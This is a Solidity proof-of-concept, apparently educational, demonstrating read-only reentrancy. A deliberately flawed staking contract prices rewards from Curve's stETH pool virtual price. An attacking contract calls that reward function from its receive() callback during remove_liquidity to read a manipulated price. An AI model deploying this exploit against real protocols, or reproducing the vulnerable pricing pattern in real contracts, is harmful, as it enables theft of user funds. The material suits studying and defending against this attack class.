// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP = 0x06325440D014e39736583c165C2963BA99fAf14E;

interface ICurve {
  function get_virtual_price() external view returns (uint);

  function add_liquidity(uint[2] calldata amounts, uint min_mint_amount)
    external
    payable
    returns (uint);

  function remove_liquidity(uint lp, uint[2] calldata min_amounts)
    external
    returns (uint[2] memory);

  function remove_liquidity_one_coin(
    uint lp,
    int128 i,
    uint min_amount
  ) external returns (uint);
}

contract Target {
  IERC20 public constant token = IERC20(LP);
  ICurve private constant pool = ICurve(STETH_POOL);

  mapping(address => uint) public balanceOf;

  function stake(uint amount) external {
    token.transferFrom(msg.sender, address(this), amount);
    balanceOf[msg.sender] += amount;
  }

  function unstake(uint amount) external {
    balanceOf[msg.sender] -= amount;
    token.transfer(msg.sender, amount);
  }

  function getReward() external returns (uint) {
    uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) / 1e18;
    // Omitting code to transfer reward tokens
    return reward;
  }
}

contract Hack {
  ICurve private constant pool = ICurve(STETH_POOL);
  IERC20 public constant lpToken = IERC20(LP);
  Target private immutable target;

  constructor(address _target) {
    target = Target(_target);
  }

  receive() external payable {
    console.log("during remove LP - virtual price", pool.get_virtual_price());
    // Attack - Log reward amount
    uint reward = target.getReward();
    console.log("reward", reward);
  }

  // Deposit into target
  function setup() external payable {
    uint[2] memory amounts = [msg.value, 0];
    uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);

    lpToken.approve(address(target), lp);
    target.stake(lp);
  }

  function pwn() external payable {
    // Add liquidity
    uint[2] memory amounts = [msg.value, 0];
    uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
    // Log get_virtual_price
    console.log("before remove LP - virtual price", pool.get_virtual_price());
    // console.log("lp", lp);

    // remove liquidity
    uint[2] memory min_amounts = [uint(0), uint(0)];
    pool.remove_liquidity(lp, min_amounts);

    // Log get_virtual_price
    console.log("after remove LP - virtual price", pool.get_virtual_price());

    // Attack - Log reward amount
    uint reward = target.getReward();
    console.log("reward", reward);
  }
}

interface IERC20 {
  function totalSupply() external view returns (uint);

  function balanceOf(address account) external view returns (uint);

  function transfer(address recipient, uint amount) external returns (bool);

  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);
}
